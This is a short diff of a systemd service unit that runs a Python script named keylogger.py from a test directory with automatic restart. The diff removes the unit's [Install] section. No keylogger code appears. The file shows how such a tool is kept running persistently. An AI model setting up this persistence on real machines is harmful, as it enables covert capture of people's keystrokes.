@@ -13,8 +13,3 @@ Environment=PYTHONUNBUFFERED=1
 Environment=DISPLAY=:0
 ExecStart=/usr/bin/python3 /home/test1/Desktop/test/keylogger.py
 Restart=always
-
-
-[Install]
-WantedBy=multi-user.target
-
